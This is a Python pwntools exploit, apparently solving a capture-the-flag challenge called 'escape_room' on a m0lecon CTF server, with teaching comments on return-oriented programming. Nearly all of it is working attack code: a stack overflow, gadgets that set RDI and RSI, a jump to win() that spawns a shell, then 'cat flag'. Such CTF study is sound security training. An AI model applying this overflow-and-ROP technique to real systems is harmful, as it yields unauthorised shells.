#!/usr/bin/env python3
from pwn import *

# From checksec:
# Stack:      No canary found   =>  buffer overflow vulnerability is present
# PIE:        No PIE (0x400000) =>  addresses are static and can be used directly in the exploit

context.binary = elf = ELF('./escape_room', checksec=False)
OFFSET_TO_RIP = 72
ret_gadget = 0x40101a

p = remote("offsec.m0lecon.it", 13542)

p.recvuntil(b"keys?")

rop = ROP(elf)  # create a ROP object for the ELF binary, which allows us to easily find gadgets and build ROP chains
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  # find the gadget that allows us to control the RDI register
                                                  # "pop rdi; ret" => pops the next value from the stack and puts it into rdi

pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]  # find the gadget that allows us to control the RSI register
                                                  # "pop rsi; ret" => pops the next value from the stack and puts it into rsi

# -----------------------------
# Key idea
# -----------------------------
# Each "ret" instruction:
#   - pops the next 8 bytes from the stack
#   - sets RIP to that value
#
# Therefore, the stack acts like a list of execution addresses.

# -----------------------------
# ROP chain flow
# -----------------------------
# 1. overflow buffer -> control RIP
# NOTE: The gadget's ret does: RIP = next value on the stack
#       and the next value on the stack is the address of the "pop rdi; ret" gadget (so we jump to it)
# 2. jump to pop rdi; ret
# NOTE: As already said, each "ret" instruction pops the next 8 bytes from the stack and sets RIP to that value
#      So, these two things happen in sequence:
#      - rdi = next value on the stack (0xdeadbeef)
#      - RIP = next value on the stack (address of "pop rsi; ret" gadget)
# 3. jump to pop rsi; ret
# NOTE: In an analogous manner, these two things happen in sequence:
#      - rsi = next value on the stack (0xcafebabe)
#      - RIP = next value on the stack (address of win() function)
# 5. jump to win()
# 6. win() spawns /bin/sh if arguments are correct

payload = flat(
    b"A"*OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(pop_rdi),   # set RDI to 0xdeadbeef (the 1st argument to the win function)
    0xdeadbeef,
    p64(pop_rsi),   # set RSI to 0xcafebabe (the 2nd argument to the win function)
    0xcafebabe,
    p64(elf.sym.win)
)

p.sendline(payload)

p.sendline(b"cat flag")

p.interactive()

